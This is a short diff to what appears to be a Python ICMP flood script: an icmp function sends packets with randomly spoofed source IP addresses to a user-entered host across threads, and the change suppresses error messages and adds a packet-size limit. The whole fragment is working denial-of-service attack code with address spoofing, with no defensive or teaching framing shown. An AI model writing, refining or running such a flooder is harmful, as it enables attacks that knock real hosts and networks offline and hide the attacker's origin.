@@ -25,8 +25,7 @@ def icmp(host, packet_size=1000):
             packet[IP].src = random_ip()
             send(packet, verbose=0)
             sent += 1
-    except Exception as e:
-        print(f"icmp error: {e}")
+    except Exception:
         pass
     finally:
         active_threads -= 1
@@ -38,6 +37,9 @@ def verbose():
 
 host = input("Host: ")
 packet_size = int(input("Size: "))
+if packet_size < 0 or packet_size > 65500:
+    print("[-] Invalid message size")
+    exit()
 host = socket.gethostbyname(host)
 
 threading.Thread(target=verbose, daemon=True).start()
